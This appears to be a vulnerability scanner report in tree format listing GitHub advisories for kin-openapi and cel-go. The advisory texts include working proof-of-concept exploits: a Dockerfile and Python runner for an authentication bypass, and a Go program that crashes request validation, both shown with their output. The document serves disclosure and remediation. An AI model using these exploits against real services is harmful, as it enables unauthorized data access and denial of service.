│                       │     │                   `main.go` creates a temporary OpenAPI 3.0 spec that declares
│                       │     │                   `GET /secret` as protected by an `apiKey` security scheme:
│                       │     │                   ```yaml
│                       │     │                   paths:
│                       │     │                     /secret:
│                       │     │                       get:
│                       │     │                         security:
│                       │     │                           - apiKey: []
│                       │     │                   components:
│                       │     │                     securitySchemes:
│                       │     │                       apiKey:
│                       │     │                         type: apiKey
│                       │     │                         name: X-Api-Key
│                       │     │                         in: header
│                       │     │                   It then constructs a `ValidationHandler` **without** setting
│                       │     │                   `AuthenticationFunc`, calls `Load()`, and sends a request
│                       │     │                   with no `X-Api-Key` header:
│                       │     │                   ```http
│                       │     │                   GET /secret HTTP/1.1
│                       │     │                   Host: example.test
│                       │     │                   # X-Api-Key header is intentionally absent
│                       │     │                   **Expected (vulnerable) output**
│                       │     │                   === CONTRAST: Direct ValidateRequest with nil
│                       │     │                   AuthenticationFunc ===
│                       │     │                     Direct ValidateRequest (nil auth) => ERROR: security
│                       │     │                   requirements failed: missing AuthenticationFunc
│                       │     │                     -> Fail-CLOSED behavior confirmed: missing auth function is
│                       │     │                    rejected
│                       │     │                   === EXPLOIT: ValidationHandler.Load() with nil
│                       │     │                     OpenAPI spec defines: security: [{apiKey: []}] on GET
│                       │     │                   /secret
│                       │     │                     ValidationHandler.AuthenticationFunc: NOT SET (nil)
│                       │     │                     Load() will inject NoopAuthenticationFunc, which always
│                       │     │                   returns nil
│                       │     │                     Request:  GET /secret  (X-Api-Key header: absent)
│                       │     │                     Response: status=200  body="SECRET_DATA\n"
│                       │     │                   [EXPLOIT SUCCESS] Auth bypass confirmed!
│                       │     │                     Protected resource /secret returned SECRET_DATA without
│                       │     │                   credentials.
│                       │     │                     ValidationHandler.Load() silently injected
│                       │     │                   NoopAuthenticationFunc.
│                       │     │                     Security requirement was bypassed. VULN-001 REPRODUCED.
│                       │     │                   The contrast block confirms fail-closed behavior when
│                       │     │                   `ValidateRequest` is called directly. The exploit block
│                       │     │                   confirms fail-open behavior through `ValidationHandler`.
│                       │     │                   Status 200 and `SECRET_DATA` are returned without any
│                       │     │                   credential.
│                       │     │                   **Remediation patch**
│                       │     │                   ```diff
│                       │     │                   --- a/openapi3filter/validation_handler.go
│                       │     │                   +++ b/openapi3filter/validation_handler.go
│                       │     │                   @@
│                       │     │                     if h.Handler == nil {
│                       │     │                         h.Handler = http.DefaultServeMux
│                       │     │                     }
│                       │     │                   - if h.AuthenticationFunc == nil {
│                       │     │                   -     h.AuthenticationFunc = NoopAuthenticationFunc
│                       │     │                   - }
│                       │     │                     if h.ErrorEncoder == nil {
│                       │     │                         h.ErrorEncoder = DefaultErrorEncoder
│                       │     │                   After this change, a nil `AuthenticationFunc` propagates into
│                       │     │                    `ValidateRequest`, which returns
│                       │     │                   `ErrAuthenticationServiceMissing` and rejects the request.
│                       │     │                   Callers who genuinely want to skip authentication can still
│                       │     │                   opt in explicitly: `h.AuthenticationFunc =
│                       │     │                   openapi3filter.NoopAuthenticationFunc`.
│                       │     │                   ### Impact
│                       │     │                   This is an **authentication bypass** vulnerability (CWE-287).
│                       │     │                    Any application that:
│                       │     │                   1. uses `openapi3filter.ValidationHandler` as its HTTP
│                       │     │                   middleware, and
│                       │     │                   2. declares one or more `security` requirements in its
│                       │     │                   OpenAPI specification, and
│                       │     │                   3. does **not** explicitly set `AuthenticationFunc`,
│                       │     │                   is fully exposed. An unauthenticated remote attacker can send
│                       │     │                    requests to any protected endpoint without supplying
│                       │     │                   credentials; the middleware accepts the request and forwards
│                       │     │                   it to the underlying handler as if authentication had
│                       │     │                   succeeded.
│                       │     │                   Affected parties include all Go services that adopt
│                       │     │                   `ValidationHandler` as a drop-in validation layer and rely on
│                       │     │                    OpenAPI `security` declarations for access control without
│                       │     │                   adding a separate authentication layer upstream (e.g., an API
│                       │     │                    gateway or reverse proxy). Because the insecure behavior is
│                       │     │                   the default, developers following the "getting started" path
│                       │     │                   are affected without any additional mistake.
│                       │     │                   The confidentiality and integrity of data behind secured
│                       │     │                   endpoints are both at high risk. Availability is not directly
│                       │     │                    affected by this vulnerability.
│                       │     │                   ### Reproduction artifacts
│                       │     │                   #### `Dockerfile`
│                       │     │                   ```dockerfile
│                       │     │                   FROM golang:1.25-alpine
│                       │     │                   # Install git (needed by go mod for some packages)
│                       │     │                   RUN apk add --no-cache git
│                       │     │                   WORKDIR /workspace
│                       │     │                   # Copy the vulnerable kin-openapi repository as a local
│                       │     │                   module replacement
│                       │     │                   COPY repo/ /kin-openapi/
│                       │     │                   # Set up the PoC Go module
│                       │     │                   RUN mkdir -p /workspace/poc
│                       │     │                   WORKDIR /workspace/poc
│                       │     │                   # Create go.mod that uses the local copy of the vulnerable
│                       │     │                   kin-openapi
│                       │     │                   RUN cat > go.mod <<'EOF'
│                       │     │                   module kin-openapi-auth-bypass-poc
│                       │     │                   go 1.25
│                       │     │                   require github.com/getkin/kin-openapi v0.143.0
│                       │     │                   replace github.com/getkin/kin-openapi => /kin-openapi
│                       │     │                   EOF
│                       │     │                   # Copy the PoC source (build context is the parent directory
│                       │     │                   of vuln-001/)
│                       │     │                   COPY vuln-001/main.go /workspace/poc/main.go
│                       │     │                   # Resolve dependencies and build
│                       │     │                   RUN go mod tidy && \
│                       │     │                       go build -o /poc-binary .
│                       │     │                   # Run the PoC
│                       │     │                   CMD ["/poc-binary"]
│                       │     │                   #### `poc.py`
│                       │     │                   ```python
│                       │     │                   #!/usr/bin/env python3
│                       │     │                   """
│                       │     │                   PoC for VULN-001: ValidationHandler.Load() Fail-Open Auth
│                       │     │                   Bypass via NoopAuthenticationFunc Default
│                       │     │                   Repository: getkin/kin-openapi v0.143.0
│                       │     │                   CWE: CWE-287 (Improper Authentication)
│                       │     │                   CVSS: 9.1 (Critical)
│                       │     │                   Vulnerability Summary:
│                       │     │                       ValidationHandler.Load() silently replaces a nil
│                       │     │                   AuthenticationFunc with NoopAuthenticationFunc.
│                       │     │                       NoopAuthenticationFunc always returns nil (no error), so
│                       │     │                   any OpenAPI security requirement
│                       │     │                       passes without validation when the user forgets to set
│                       │     │                   AuthenticationFunc.
│                       │     │                       Contrast: ValidateRequest() with nil AuthenticationFunc
│                       │     │                   returns ErrAuthenticationServiceMissing
│                       │     │                       (fail-closed). ValidationHandler.Load() breaks this
│                       │     │                   guarantee (fail-open).
│                       │     │                   Usage:
│                       │     │                       python3 poc.py [--build-dir <dir>] [--image <name>]
│                       │     │                   [--no-cleanup]
│                       │     │                   import argparse
│                       │     │                   import os
│                       │     │                   import subprocess
│                       │     │                   import sys
│                       │     │                   import json
│                       │     │                   IMAGE_NAME = "vuln001-auth-bypass-poc"
│                       │     │                   SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
│                       │     │                   REPO_DIR = os.path.join(os.path.dirname(SCRIPT_DIR), "repo")
│                       │     │                   SUCCESS_MARKER = "[EXPLOIT SUCCESS]"
│                       │     │                   EXPECTED_STATUS = "status=200"
│                       │     │                   EXPECTED_BODY = 'body="SECRET_DATA\\n"'
│                       │     │                   def run(cmd, **kwargs):
│                       │     │                       """Run a shell command and return (returncode, stdout,
│                       │     │                   stderr)."""
│                       │     │                       print(f"[CMD] {' '.join(cmd)}")
│                       │     │                       result = subprocess.run(cmd, capture_output=True,
│                       │     │                   text=True, **kwargs)
│                       │     │                       if result.stdout:
│                       │     │                           print(result.stdout, end="")
│                       │     │                       if result.stderr:
│                       │     │                           print(result.stderr, end="", file=sys.stderr)
│                       │     │                       return result.returncode, result.stdout, result.stderr
│                       │     │                   def build_image(build_dir):
│                       │     │                       """Build the Docker image containing the PoC binary."""
│                       │     │                       print("\n[*] Building Docker image ...")
│                       │     │                       rc, stdout, stderr = run([
│                       │     │                           "docker", "build",
│                       │     │                           "--build-arg", f"REPO_DIR={REPO_DIR}",
│                       │     │                           "-t", IMAGE_NAME,
│                       │     │                           "-f", os.path.join(build_dir, "Dockerfile"),
│                       │     │                           # Build context is the reports root so both
│                       │     │                   Dockerfile and repo/ are reachable
│                       │     │                           os.path.dirname(build_dir),
│                       │     │                       ])
│                       │     │                       if rc != 0:
│                       │     │                           print(f"[ERROR] Docker build failed (exit {rc})",
│                       │     │                   file=sys.stderr)
│                       │     │                           sys.exit(rc)
│                       │     │                       print("[*] Docker build succeeded.")
│                       │     │                       return f"docker build -t {IMAGE_NAME} -f
│                       │     │                   {os.path.join(build_dir, 'Dockerfile')}
│                       │     │                   {os.path.dirname(build_dir)}"
│                       │     │                   def run_container():
│                       │     │                       """Run the container and capture output."""
│                       │     │                       print("\n[*] Running PoC container ...")
│                       │     │                           "docker", "run", "--rm",
│                       │     │                           "--network", "none",   # no network access needed
│                       │     │                           IMAGE_NAME,
│                       │     │                       combined = stdout + stderr
│                       │     │                       return rc, combined
│                       │     │                   def evaluate(exit_code, output):
│                       │     │                       """Determine whether the exploit was confirmed."""
│                       │     │                       passed = (
│                       │     │                           exit_code == 0
│                       │     │                           and SUCCESS_MARKER in output
│                       │     │                           and EXPECTED_STATUS in output
│                       │     │                           and EXPECTED_BODY in output
│                       │     │                       )
│                       │     │                       return passed
│                       │     │                   def cleanup_image():
│                       │     │                       """Remove the Docker image."""
│                       │     │                       print(f"\n[*] Removing Docker image {IMAGE_NAME} ...")
│                       │     │                       run(["docker", "rmi", "-f", IMAGE_NAME])
│                       │     │                   def main():
│                       │     │                       global IMAGE_NAME
│                       │     │                       parser = argparse.ArgumentParser(description="VULN-001
│                       │     │                   Auth Bypass PoC runner")
│                       │     │                       parser.add_argument("--build-dir", default=SCRIPT_DIR,
│                       │     │                                           help="Directory containing Dockerfile
│                       │     │                    and main.go")
│                       │     │                       parser.add_argument("--image", default=IMAGE_NAME,
│                       │     │                                           help="Docker image name to
│                       │     │                   build/run")
│                       │     │                       parser.add_argument("--no-cleanup", action="store_true",
│                       │     │                                           help="Keep the Docker image after the
│                       │     │                    run")
│                       │     │                       args = parser.parse_args()
│                       │     │                       IMAGE_NAME = args.image
│                       │     │                       print("=" * 60)
│                       │     │                       print("VULN-001 PoC: Auth Bypass via
│                       │     │                   NoopAuthenticationFunc Default")
│                       │     │                       print(f"  Build dir : {args.build_dir}")
│                       │     │                       print(f"  Repo dir  : {REPO_DIR}")
│                       │     │                       print(f"  Image     : {IMAGE_NAME}")
│                       │     │                       build_cmd = build_image(args.build_dir)
│                       │     │                       run_cmd = f"docker run --rm --network none {IMAGE_NAME}"
│                       │     │                       exit_code, output = run_container()
│                       │     │                       if not args.no_cleanup:
│                       │     │                           cleanup_image()
│                       │     │                       passed = evaluate(exit_code, output)
│                       │     │                       print("\n" + "=" * 60)
│                       │     │                       if passed:
│                       │     │                           print("[RESULT] PASS — Auth bypass CONFIRMED")
│                       │     │                           print("  The protected handler returned SECRET_DATA
│                       │     │                   without credentials.")
│                       │     │                           print("  ValidationHandler.Load() injected
│                       │     │                   NoopAuthenticationFunc silently.")
│                       │     │                       else:
│                       │     │                           print(f"[RESULT] FAIL — Exploit not confirmed
│                       │     │                   (exit={exit_code})")
│                       │     │                       print(f"\nContainer exit code : {exit_code}")
│                       │     │                       print(f"Success marker found: {SUCCESS_MARKER in
│                       │     │                   output}")
│                       │     │                       print(f"Status 200 found    : {EXPECTED_STATUS in
│                       │     │                       print(f"Secret body found   : {EXPECTED_BODY in
│                       │     │                       # Exit with code that signals pass/fail
│                       │     │                       sys.exit(0 if passed else 1)
│                       │     │                   if __name__ == "__main__":
│                       │     │                       main()
│                       │     │                   ``` 
│                       │     ├ Severity        : CRITICAL 
│                       │     ├ VendorSeverity   ─ ghsa: 4 
│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N 
│                       │     │                         ╰ V3Score : 9.1 
│                       │     ├ References       ╭ [0]: https://github.com/getkin/kin-openapi 
│                       │     │                  ├ [1]: https://github.com/getkin/kin-openapi/commit/f0407d53b0
│                       │     │                  │      730280266f454b755010e7eeb985da 
│                       │     │                  ├ [2]: https://github.com/getkin/kin-openapi/releases/tag/v0.1
│                       │     │                  │      44.0 
│                       │     │                  ╰ [3]: https://github.com/getkin/kin-openapi/security/advisori
│                       │     │                         es/GHSA-r277-6w6q-xmqw 
│                       │     ├ PublishedDate   : 2026-07-24T16:52:05Z 
│                       │     ╰ LastModifiedDate: 2026-07-24T16:52:05Z 
│                       ├ [1] ╭ VulnerabilityID : GHSA-jpcw-4wr7-c3vq 
│                       │     ├ PkgID           : github.com/getkin/kin-openapi@v0.140.0 
│                       │     ├ PkgName         : github.com/getkin/kin-openapi 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/getkin/kin-openapi@v0.140.0 
│                       │     │                  ╰ UID : 569a48646b538692 
│                       │     ├ InstalledVersion: v0.140.0 
│                       │     ├ FixedVersion    : 0.144.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-jpcw-4wr7-c3vq 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:6af60a88ad5ae5c062fee0031c0444c066d38b8f272509106d4ab2
│                       │     │                   7513c7966a 
│                       │     ├ Title           : kin-openapi openapi3filter: unauthenticated nil-pointer panic
│                       │     │                    when validating a request against a `content` parameter
│                       │     │                   whose media type has no schema 
│                       │     ├ Description     : | Field | Value |
│                       │     │                   |---|---|
│                       │     │                   | Ecosystem | Go |
│                       │     │                   | Package | `github.com/getkin/kin-openapi` |
│                       │     │                   | Affected versions | `<= 0.143.0` (introduced in `v0.2.0`,
│                       │     │                   PR #90, 2019-05-07; reproduced on `HEAD` `30e2923`) |
│                       │     │                   | Patched versions | 0.144.0 |
│                       │     │                   ---
│                       │     │                   
│                       │     │                   ### Summary
│                       │     │                   `openapi3filter.ValidateRequest` contains a
│                       │     │                   NULL-pointer-dereference denial of service: any
│                       │     │                   **unauthenticated** client can crash the request-validation
│                       │     │                   path with a **single** HTTP request. When an operation
│                       │     │                   declares a `content` parameter (as opposed to a `schema`
│                       │     │                   parameter) whose media type object has **no `schema`**,
│                       │     │                   request validation dereferences that missing schema and
│                       │     │                   panics. The document is legal under the OpenAPI Specification
│                       │     │                    — kin-openapi's own `doc.Validate()` accepts it — and the
│                       │     │                   defect affects **both OpenAPI 3.0.x and 3.1.x**. Depending on
│                       │     │                    how the library is wired into the server (see Impact), this
│                       │     │                   ranges from a per-request abort with unbounded panic-log
│                       │     │                   growth to a full remote process crash.
│                       │     │                   ### Details
│                       │     │                   The decoder used for `content` parameters when no custom
│                       │     │                   `ParamDecoder` is configured (the library default),
│                       │     │                   `defaultContentParameterDecoder`, dereferences the media-type
│                       │     │                    schema without a nil check.
│                       │     │                   `openapi3filter/req_resp_decoder.go`, around line 197:
│                       │     │                   ```go
│                       │     │                   mt := content.Get("application/json")
│                       │     │                   if mt == nil {                       // media-type OBJECT is
│                       │     │                   guarded ...
│                       │     │                       err = fmt.Errorf("parameter %q has no content schema",
│                       │     │                   param.Name)
│                       │     │                       return
│                       │     │                   }
│                       │     │                   outSchema = mt.Schema.Value          // ... but mt.Schema is
│                       │     │                   NOT — panics when nil
│                       │     │                   ```
│                       │     │                   The function guards `param.Content == nil`, `len(content) !=
│                       │     │                   1`, and `mt == nil`, but never `mt.Schema == nil`.
│                       │     │                   **Why a schema-less content parameter is legal** (so the sink
│                       │     │                    is reachable — `doc.Validate()` returns no error), in both
│                       │     │                   3.0.x and 3.1.x:
│                       │     │                   - `openapi3/parameter.go` — `Parameter.Validate` only
│                       │     │                   enforces *exactly one of `schema` XOR `content`*; a parameter
│                       │     │                    with `content` (and no `schema`) satisfies it.
│                       │     │                   - `openapi3/media_type.go` — `MediaType.Validate` validates
│                       │     │                   the schema **only when it is non-nil**, so an absent schema
│                       │     │                   is not a validation error.
│                       │     │                   **Call path to the panic:**
│                       │     │                   ValidateRequest                         
│                       │     │                   openapi3filter/validate_request.go:83
│                       │     │                     └─ ValidateParameter                  
│                       │     │                   openapi3filter/validate_request.go:177   (parameter.Content
│                       │     │                   != nil)
│                       │     │                          └─ decodeContentParameter        
│                       │     │                   openapi3filter/req_resp_decoder.go:166   (attacker supplies
│                       │     │                   value ⇒ found)
│                       │     │                               └─ defaultContentParameterDecoder  
│                       │     │                   openapi3filter/req_resp_decoder.go:197   ← nil deref / panic
│                       │     │                   **Authentication note:** `ValidateRequest` validates security
│                       │     │                    *before* parameters, but the panic is reachable **without
│                       │     │                   credentials** whenever the target operation declares no
│                       │     │                   security requirement, or when no `AuthenticationFunc` is
│                       │     │                   configured (it is opt-in). A single unauthenticated operation
│                       │     │                    anywhere in the served spec is sufficient. If an operation
│                       │     │                   *does* declare security and a rejecting `AuthenticationFunc`
│                       │     │                   is wired, that request is rejected before decoding.
│                       │     │                   ### PoC
│                       │     │                   Reproduced end-to-end against `HEAD` (`30e2923`) with a real
│                       │     │                   `net/http` server and a stock `http.Client`.
│                       │     │                   **1. Minimal OpenAPI 3.0.3 document** (legal —
│                       │     │                   `doc.Validate()` passes). The `cfg` query parameter uses
│                       │     │                   `content` with an `application/json` media type that has **no
│                       │     │                    `schema`**:
│                       │     │                   ```yaml
│                       │     │                   openapi: 3.0.3
│                       │     │                   info: {title: poc, version: "1.0.0"}
│                       │     │                   paths:
│                       │     │                     /c:
│                       │     │                       get:
│                       │     │                         parameters:
│                       │     │                           - name: cfg
│                       │     │                             in: query
│                       │     │                             content:
│                       │     │                               application/json: {}      # media type object
│                       │     │                   with NO schema
│                       │     │                         responses:
│                       │     │                           "200": {description: ok}
│                       │     │                   **2. A complete, self-contained program.** Drop this into a
│                       │     │                   directory inside a checkout of
│                       │     │                   `github.com/getkin/kin-openapi` and run it with `go run .`.
│                       │     │                   It loads the document above, asserts `doc.Validate()` accepts
│                       │     │                    it (proving reachability), serves it behind request
│                       │     │                   validation exactly as the recommended middleware does, and
│                       │     │                   sends one unauthenticated `GET /c?cfg=1`:
│                       │     │                   package main
│                       │     │                   import (
│                       │     │                   	"context"
│                       │     │                   	"fmt"
│                       │     │                   	"net/http"
│                       │     │                   	"net/http/httptest"
│                       │     │                   	"github.com/getkin/kin-openapi/openapi3"
│                       │     │                   	"github.com/getkin/kin-openapi/openapi3filter"
│                       │     │                   	"github.com/getkin/kin-openapi/routers/gorillamux"
│                       │     │                   )
│                       │     │                   const spec = `
│                       │     │                   `
│                       │     │                   func main() {
│                       │     │                   	loader := openapi3.NewLoader()
│                       │     │                   	doc, err := loader.LoadFromData([]byte(spec))
│                       │     │                   	if err != nil {
│                       │     │                   		panic(err)
│                       │     │                   	}
│                       │     │                   	// Reachability: the malformed-but-legal document must
│                       │     │                   validate.
│                       │     │                   	if err := doc.Validate(context.Background()); err != nil {
│                       │     │                   		panic("doc.Validate rejected the spec, not reachable: " +
│                       │     │                   err.Error())
│                       │     │                   	router, err := gorillamux.NewRouter(doc)
│                       │     │                   	// Handler mirrors openapi3filter.ValidationHandler: find
│                       │     │                   route, validate.
│                       │     │                   	h := http.HandlerFunc(func(w http.ResponseWriter, r
│                       │     │                   *http.Request) {
│                       │     │                   		route, pathParams, err := router.FindRoute(r)
│                       │     │                   		if err != nil {
│                       │     │                   			http.Error(w, err.Error(), http.StatusNotFound)
│                       │     │                   			return
│                       │     │                   		}
│                       │     │                   		// Panics here on the crafted request
│                       │     │                   (req_resp_decoder.go:197).
│                       │     │                   		if err := openapi3filter.ValidateRequest(r.Context(),
│                       │     │                   &openapi3filter.RequestValidationInput{
│                       │     │                   			Request:    r,
│                       │     │                   			PathParams: pathParams,
│                       │     │                   			Route:      route,
│                       │     │                   			Options:    &openapi3filter.Options{AuthenticationFunc:
│                       │     │                   openapi3filter.NoopAuthenticationFunc},
│                       │     │                   		}); err != nil {
│                       │     │                   			http.Error(w, err.Error(), http.StatusBadRequest)
│                       │     │                   		w.WriteHeader(http.StatusOK)
│                       │     │                   	})
│                       │     │                   	srv := httptest.NewServer(h)
│                       │     │                   	defer srv.Close()
│                       │     │                   	// The single, unauthenticated attack request.
│                       │     │                   	resp, err := http.Get(srv.URL + "/c?cfg=1")
│                       │     │                   		// Expected: the server goroutine panicked, so the client
│                       │     │                   sees EOF.
│                       │     │                   		fmt.Printf("client received an aborted response (expected):
│                       │     │                    %v\n", err)
│                       │     │                   		return
│                       │     │                   	defer resp.Body.Close()
│                       │     │                   	fmt.Printf("UNEXPECTED: got HTTP %d without a panic\n",
│                       │     │                   resp.StatusCode)
│                       │     │                   **3. Observed result** — the request goroutine panics inside
│                       │     │                   validation, and the client's `http.Get` returns an EOF:
│                       │     │                   http: panic serving 127.0.0.1:xxxxx: runtime error: invalid
│                       │     │                   memory address or nil pointer dereference
│                       │     │                   github.com/getkin/kin-openapi/openapi3filter.defaultContentPa
│                       │     │                   rameterDecoder(...)
│                       │     │                   	openapi3filter/req_resp_decoder.go:197
│                       │     │                   github.com/getkin/kin-openapi/openapi3filter.decodeContentPar
│                       │     │                   ameter(...)
│                       │     │                   	openapi3filter/req_resp_decoder.go:166
│                       │     │                   github.com/getkin/kin-openapi/openapi3filter.ValidateParamete
│                       │     │                   r(...)
│                       │     │                   	openapi3filter/validate_request.go:177
│                       │     │                   github.com/getkin/kin-openapi/openapi3filter.ValidateRequest(
│                       │     │                   ...)
│                       │     │                   	openapi3filter/validate_request.go:83
│                       │     │                   Swapping the media type for one that carries a schema
│                       │     │                   (`application/json: {schema: {type: object}}`) makes the same
│                       │     │                    request return a clean `400` instead of panicking,
│                       │     │                   confirming the missing schema is the cause.
│                       │     │                   ### Impact
│                       │     │                   This is an **unauthenticated remote denial of service**
│                       │     │                   (CWE-476) against any service that validates incoming
│                       │     │                   requests with `openapi3filter` and serves a spec containing
│                       │     │                   at least one `content` parameter whose media type lacks a
│                       │     │                   `schema`.
│                       │     │                   The precise consequence depends on which goroutine runs the
│                       │     │                   panic and whether a `recover()` covers it:
│                       │     │                   | Wiring | Recovered by `net/http`? | Result |
│                       │     │                   |---|---|---|
│                       │     │                   | Synchronous middleware / handler on `net/http` (incl.
│                       │     │                   `openapi3filter.ValidationHandler`) | Yes | Process survives;
│                       │     │                    the one request is aborted. A remote unauthenticated party
│                       │     │                   can still drive connection churn + unbounded `http: panic
│                       │     │                   serving` log growth. |
│                       │     │                   | `ValidateRequest` on an app-spawned goroutine (fan-out,
│                       │     │                   `errgroup`, async pre-check) | No | **Whole process crashes**
│                       │     │                    on a single unauthenticated request unless the app added its
│                       │     │                    own `recover()`. |
│                       │     │                   | Non-`net/http` host (fasthttp adaptor, gRPC-gateway shim,
│                       │     │                   CLI, offline/batch spec validator) | No | **Whole process
│                       │     │                   crashes.** |
│                       │     │                   This is why the suggested CVSS uses `A:L` (Base 5.3): under
│                       │     │                   the recommended synchronous `net/http` wiring the panic is
│                       │     │                   recovered per-connection. Reviewers may reasonably raise it
│                       │     │                   to `A:H` (Base 7.5) for the spawned-goroutine and
│                       │     │                   non-`net/http` integrations, where a single request kills the
│                       │     │                    process.
│                       │     │                   ## Remediation (suggested)
│                       │     │                   Add a `mt.Schema == nil` guard mirroring the existing `mt ==
│                       │     │                   nil` guard, so a schema-less content parameter yields a clean
│                       │     │                    validation error instead of a panic:
│                       │     │                   if mt == nil {
│                       │     │                   if mt.Schema == nil {
│                       │     │                       err = fmt.Errorf("parameter %q content media type has no
│                       │     │                   schema", param.Name)
│                       │     │                   outSchema = mt.Schema.Value
│                       │     │                   The `unmarshal` closure immediately below already tolerates a
│                       │     │                    nil schema (it checks `paramSchema != nil`), so returning
│                       │     │                   early on nil `mt.Schema` is consistent with surrounding
│                       │     │                   intent.
│                       │     │                   **Workarounds for consumers, pending a patch:**
│                       │     │                   - Ensure every `content` parameter in served specs declares a
│                       │     │                    `schema`, or reject such specs at load time.
│                       │     │                   - Supply a custom `ParamDecoder` that guards `mt.Schema ==
│                       │     │                   nil`.
│                       │     │                   - Run request validation inside a handler with an explicit
│                       │     │                   `recover()` — especially if validation runs off the request
│                       │     │                   goroutine or on a non-`net/http` host.
│                       │     │                   ## Notes for the maintainer
│                       │     │                   This root cause (`mt.Schema == nil`) is independent of the
│                       │     │                   `Items == nil` panics addressed in `30e2923` and of
│                       │     │                   `GHSA-mmfr-pmjx-hw9w`; no prior fix touched this code path.
│                       │     │                   It affects OpenAPI 3.0.x as well as 3.1.x. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ VendorSeverity   ─ ghsa: 2 
│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│                       │     │                         ╰ V3Score : 5.3 
│                       │     ├ References       ╭ [0]: https://github.com/getkin/kin-openapi 
│                       │     │                  ├ [1]: https://github.com/getkin/kin-openapi/commit/68ac2affa3
│                       │     │                  │      25514d7d6e731204d6a1edf6bdff64 
│                       │     │                  ├ [2]: https://github.com/getkin/kin-openapi/releases/tag/v0.1
│                       │     │                  │      44.0 
│                       │     │                  ╰ [3]: https://github.com/getkin/kin-openapi/security/advisori
│                       │     │                         es/GHSA-jpcw-4wr7-c3vq 
│                       │     ├ PublishedDate   : 2026-07-24T22:39:39Z 
│                       │     ╰ LastModifiedDate: 2026-07-24T22:39:39Z 
│                       ├ [2] ╭ VulnerabilityID : GHSA-gcjh-h69q-9w9g 
│                       │     ├ PkgID           : github.com/google/cel-go@v0.28.1 
│                       │     ├ PkgName         : github.com/google/cel-go 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/google/cel-go@v0.28.1 
│                       │     │                  ╰ UID : 9d55b7b902f32022 
│                       │     ├ InstalledVersion: v0.28.1 
│                       │     ├ FixedVersion    : 0.29.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-gcjh-h69q-9w9g 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:28eb1705cfa51484312ea76bfe659a6ed156e3e97a541a7a446afd
│                       │     │                   9ab6760998 
│                       │     ├ Title           : cel-go: JSON Private Fields Exposed via NativeTypes and
│                       │     │                   ParseStructTag 
│                       │     ├ Description     : The function `ext.NativeTypes(ParseStructTag("json"))` does
│                       │     │                   not honour the `encoding/json` skip directive `json:"-"`.
│                       │     │                   Fields tagged `json:"-"` are registered in the CEL type
│                       │     │                   system under the literal name `"-"` and are readable from any
│                       │     │                    user-submitted CEL expression via `dyn(obj)["-"]`. 
│                       │     │                   
│                       │     │                   Additionally, `newNativeTypes` silently registers every
│                       │     │                   nested struct reachable from the type passed to
│                       │     │                   `NativeTypes`, including types from third-party dependencies
│                       │     │                   the developer never examined.
│                       │     │                   ## Root cause
│                       │     │                   In `fieldNameByTag`, the helper used by
│                       │     │                   `ParseStructTag("json")` to translate Go struct tags into CEL
│                       │     │                    field names.
│                       │     │                   See at `ext/native.go:146`:
│                       │     │                   ```go
│                       │     │                   func fieldNameByTag(structTagToParse string) func(field
│                       │     │                   reflect.StructField) string {
│                       │     │                       return func(field reflect.StructField) string {
│                       │     │                           tag, found := field.Tag.Lookup(structTagToParse)
│                       │     │                           if found {
│                       │     │                               splits := strings.Split(tag, ",")
│                       │     │                               if len(splits) > 0 {
│                       │     │                                   // We make the assumption that the leftmost
│                       │     │                   entry in the tag is the name.
│                       │     │                                   // This seems to be true for most tags that
│                       │     │                   have the concept of a name/key, such as:
│                       │     │                                   // https://pkg.go.dev/encoding/xml#Marshal
│                       │     │                                   // https://pkg.go.dev/encoding/json#Marshal
│                       │     │                                   //
│                       │     │                   https://pkg.go.dev/go.mongodb.org/mongo-driver/bson#hdr-Struc
│                       │     │                   ts
│                       │     │                   https://pkg.go.dev/go.yaml.in/yaml/v3#Marshal
│                       │     │                                   name := splits[0]
│                       │     │                                   return name
│                       │     │                               }
│                       │     │                           }
│                       │     │                           return field.Name
│                       │     │                       }
│                       │     │                   }
│                       │     │                   ```
│                       │     │                   For a field tagged `json:"-"`, this code splits the tag into
│                       │     │                   `[]string{"-"}` and returns `"-"` as the CEL field name. It
│                       │     │                   never checks whether `"-"` is the JSON skip sentinel.
│                       │     │                   This contradicts the `encoding/json` rule that the source
│                       │     │                   comment explicitly points readers to:
│                       │     │                   ```text
│                       │     │                   As a special case, if the field tag is "-", the field is
│                       │     │                   always omitted. Note
│                       │     │                   that a field with name "-" can still be generated using the
│                       │     │                   tag "-,".
│                       │     │                   The public option also documents JSON-style parsing as the
│                       │     │                   intended behavior.
│                       │     │                   See at `ext/native.go:190`:
│                       │     │                   // ParseStructTag configures the struct tag to parse. The 0th
│                       │     │                    item in the tag is used as the name of the CEL field.
│                       │     │                   // For example:
│                       │     │                   // If the tag to parse is "cel" and the struct field has tag
│                       │     │                   cel:"foo", the CEL struct field will be "foo".
